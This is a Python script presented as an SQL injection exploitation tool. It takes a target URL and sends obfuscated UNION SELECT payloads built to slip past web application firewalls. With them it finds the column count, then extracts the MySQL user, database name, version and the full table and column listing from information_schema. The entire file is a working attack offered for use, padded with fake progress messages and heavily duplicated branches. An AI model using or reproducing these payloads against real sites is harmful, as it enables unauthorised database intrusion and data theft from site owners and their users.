# SQL
import requests
import os
import re
import datetime
import time
from bs4 import BeautifulSoup

os.system('cls' if os.name == 'nt' else 'clear')
def banner():
    print("""                    
                                 _ _ 
                 ___ _ _ ___ ___| |_| {1.1.2}
                | . | | |_ -| . | | |
                |  _|_  |___|_  |_|_| 
                |_| |___|     |_|    
                                
[...:::       Copyright By Pham Chien        :::...]
[...:::   Code By TEAM : ghostman security   :::...]
[...:::  website : ghostmanews.blogspot.com  :::...]
[...:::     github : github.com/Phamchie     :::...]
[...:::       Twitter : @Anonym0us_VNPC      :::...]
""")
banner()
url = input("URL TARgET : ")
print("")
time_start = datetime.datetime.now()
start_exploit = time_start.strftime("Starting exploit time : %H:%M:%S - /%d/%m/%Y")
print(start_exploit)
time.sleep(2)
payload_name_bypass_1 = [
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/ NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
]
text_check = 0
print("[-] Testing 'UNION SELECT COLUMNS'")
for payload in payload_name_bypass_1:
    text_check += 1
    time.sleep(0.10)
    result_1 = requests.get(url + payload)
    connects = requests.get(url)
    if connects.status_code == 200 or connects.status_code == 301:
        if str(text_check) in result_1.text:
            pass
            if "The used SELECT" in result_1.text:
                pass
            else:
                print("----------------------------")
                print("find columns : {}".format(text_check))
                print("PARAMETER : 1")
                print("[:] URL : {}".format(url))
                print("[:] NUM COLUMNS : {}".format(text_check))
                print("[:] PAYLOAD : {}".format(payload))
                print("[:] LINK : {}{}".format(url, payload))
                print("----------------------------")
                choose = input("[+] Do You Want To Get MySQL DBMS Information [ Y/n ] : ")
                if choose == "Y":
                    get_num = input("Number Columns : ")
                    print("[-] Starting Checking COLUMNS")
                    time.sleep(2)
                    if str(get_num) in result_1.text:
                        print("[-] COLUMNS Find")
                        time.sleep(1)
                        print("[-] Getting the target's DBMS information in progress...")
                        time.sleep(5)
                        time.sleep(0.50)
                        query = re.sub(r"\b" + re.escape(get_num) + r"\b", "user()", payload)
                        new_payload = f"{query}"
                        query1 = re.sub(r"\b" + re.escape(get_num) + r"\b", "database()", payload)
                        query2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "version()", payload)
                        check = requests.get(url + new_payload)
                        if "The used SELECT" in check.text:
                            pass
                        else:
                            print("----------------------------")
                            print("username mysql")
                            print("PARAMETER : user")
                            print("")
                            print("[+] URL : {}".format(url))
                            print("")
                            print("[+] PAYLOAD : {}".format(new_payload))
                            print("")
                            print("[+] LINK : {}{}".format(url, new_payload))
                            print("")
                            print("----------------------------")
                            check = requests.get(url + query1)
                            print("database name mysql")
                            print("PARAMETER : database name")
                            print("")
                            print("[+] URL : {}".format(url))
                            print("")
                            print("[+] PAYLOAD : {}".format(query1))
                            print("")
                            print("[+] LINK : {}{}".format(url, query1))
                            print("----------------------------")
                            check = requests.get(url + query2)
                            print("version name mysql")
                            print("PARAMETER : version")
                            print("")
                            print("[+] URL : {}".format(url))
                            print("")
                            print("[+] PAYLOAD : {}".format(query2))
                            print("")
                            print("[+] LINK : {}{}".format(url, query2))
                            print("----------------------------")
                            print('')
                            choose1 = input("do you want to check Database Tables and columns ? [ Y/n ]: ")
                            if choose1 == "Y":
                                payloads = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema=database())", payload)
                                payloads_1 = f"{payloads}"
                                payloads_2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema='information_schema')", payload)
                                payload_2 = f"{payloads_2}"
                                print("[+] Payload test in progress...")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT'")
                                time.sleep(1.5)
                                print("[+] Testing 'UNION SELECT COLUMNS")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (NUMBERS)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MYSQL COMMAND)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (DIOS)")
                                time.sleep(0.50)
                                print("[+] Testing 'UNION SELECT COLUMNS (NULL)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL COMMAND, NUMBER COLUMNS)")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL >= 5.0.12 UNION SELECT)")
                                time.sleep(3)
                                print("[+] Testing 'UNION SELECT COLUMNS (TESTING 1 - 20 COLUMNS)")
                                get_dbms = requests.get(url + payloads_1)
                                if "The used SELECT" in get_dbms.text:
                                    pass
                                else:
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_1))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_1))
                                    print("")
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_2))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_2))
                                    print("----------------------------")
                                    exit()
                                    
                            elif choose1 == "y":
                                payloads = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema=database())", payload)
                                payloads_1 = f"{payloads}"
                                payloads_2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema='information_schema')", payload)
                                payload_2 = f"{payloads_2}"
                                print("[+] Payload test in progress...")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT'")
                                time.sleep(1.5)
                                print("[+] Testing 'UNION SELECT COLUMNS")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (NUMBERS)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MYSQL COMMAND)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (DIOS)")
                                time.sleep(0.50)
                                print("[+] Testing 'UNION SELECT COLUMNS (NULL)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL COMMAND, NUMBER COLUMNS)")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL >= 5.0.12 UNION SELECT)")
                                time.sleep(3)
                                print("[+] Testing 'UNION SELECT COLUMNS (TESTING 1 - 20 COLUMNS)")
                                get_dbms = requests.get(url + payloads_1)
                                if "The used SELECT" in get_dbms.text:
                                    pass
                                else:
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_1))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_1))
                                    print("")
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_2))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_2))
                                    print("----------------------------")
                                    exit()
                            else:
                                end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                                exit(end_time)
                    else:
                        print("The column number is not appropriate, or incorrect, please try again later")
                        end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                        exit(end_time)

                elif choose == "y":
                    get_num = input("Number Columns : ")
                    print("[-] Starting Checking COLUMNS")
                    time.sleep(2)
                    if str(get_num) in result_1.text:
                        print("[-] COLUMNS Find")
                        time.sleep(1)
                        print("[-] Getting the target's DBMS information in progress...")
                        time.sleep(5)
                        time.sleep(0.50)
                        query = re.sub(r"\b" + re.escape(get_num) + r"\b", "user()", payload)
                        new_payload = f"{query}"
                        query1 = re.sub(r"\b" + re.escape(get_num) + r"\b", "database()", payload)
                        query2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "version()", payload)
                        check = requests.get(url + new_payload)
                        if "The used SELECT" in check.text:
                            pass
                        else:
                            print("----------------------------")
                            print("username mysql")
                            print("PARAMETER : user")
                            print("")
                            print("[+] URL : {}".format(url))
                            print("")
                            print("[+] PAYLOAD : {}".format(new_payload))
                            print("")
                            print("[+] LINK : {}{}".format(url, new_payload))
                            print("")
                            print("----------------------------")
                            check = requests.get(url + query1)
                            print("database name mysql")
                            print("PARAMETER : database name")
                            print("")
                            print("[+] URL : {}".format(url))
                            print("")
                            print("[+] PAYLOAD : {}".format(query1))
                            print("")
                            print("[+] LINK : {}{}".format(url, query1))
                            print("----------------------------")
                            check = requests.get(url + query2)
                            print("version name mysql")
                            print("PARAMETER : version")
                            print("")
                            print("[+] URL : {}".format(url))
                            print("")
                            print("[+] PAYLOAD : {}".format(query2))
                            print("")
                            print("[+] LINK : {}{}".format(url, query2))
                            print("----------------------------")
                            print('')
                            choose1 = input("do you want to check Database Tables and columns ? [ Y/n ]: ")
                            if choose1 == "Y":
                                payloads = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema=database())", payload)
                                payloads_1 = f"{payloads}"
                                payloads_2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema='information_schema')", payload)
                                payload_2 = f"{payloads_2}"
                                print("[+] Payload test in progress...")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT'")
                                time.sleep(1.5)
                                print("[+] Testing 'UNION SELECT COLUMNS")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (NUMBERS)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MYSQL COMMAND)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (DIOS)")
                                time.sleep(0.50)
                                print("[+] Testing 'UNION SELECT COLUMNS (NULL)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL COMMAND, NUMBER COLUMNS)")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL >= 5.0.12 UNION SELECT)")
                                time.sleep(3)
                                print("[+] Testing 'UNION SELECT COLUMNS (TESTING 1 - 20 COLUMNS)")
                                get_dbms = requests.get(url + payloads_1)
                                if "The used SELECT" in get_dbms.text:
                                    pass
                                else:
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_1))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_1))
                                    print("")
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_2))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_2))
                                    print("----------------------------")
                                    exit()
                                    
                            elif choose1 == "y":
                                payloads = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema=database())", payload)
                                payloads_1 = f"{payloads}"
                                payloads_2 = re.sub(r"\b" + re.escape(get_num) + r"\b", "(Select Group_CONCAT(table_name,' :: ',column_name+SEPARATOR+'<br>')/**8**/FROM/**8**/information_schema.columns/**8**/WHERE/**8**/table_schema='information_schema')", payload)
                                payload_2 = f"{payloads_2}"
                                print("[+] Payload test in progress...")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT'")
                                time.sleep(1.5)
                                print("[+] Testing 'UNION SELECT COLUMNS")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (NUMBERS)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MYSQL COMMAND)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (DIOS)")
                                time.sleep(0.50)
                                print("[+] Testing 'UNION SELECT COLUMNS (NULL)")
                                time.sleep(2.5)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL COMMAND, NUMBER COLUMNS)")
                                time.sleep(2)
                                print("[+] Testing 'UNION SELECT COLUMNS (MySQL >= 5.0.12 UNION SELECT)")
                                time.sleep(3)
                                print("[+] Testing 'UNION SELECT COLUMNS (TESTING 1 - 20 COLUMNS)")
                                get_dbms = requests.get(url + payloads_1)
                                if "The used SELECT" in get_dbms.text:
                                    pass
                                else:
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_1))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_1))
                                    print("")
                                    print("----------------------------")
                                    print("find columns : {}".format(text_check))
                                    print("PARAMETER : 1")
                                    print("")
                                    print("[:] URL : {}".format(url))
                                    print("")
                                    print("[:] NUM COLUMNS : {}".format(text_check))
                                    print("")
                                    print("[:] PAYLOAD : {}".format(payloads_2))
                                    print("")
                                    print("[:] LINK : {}{}".format(url, payloads_2))
                                    print("----------------------------")
                                    exit()
                            else:
                                end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                                exit(end_time)
                    else:
                        print("The column number is not appropriate, or incorrect, please try again later")
                        end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                        exit(end_time)
                else:
                    end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                    exit(end_time)
    else:
        print("[?] connected failed")
        exit()
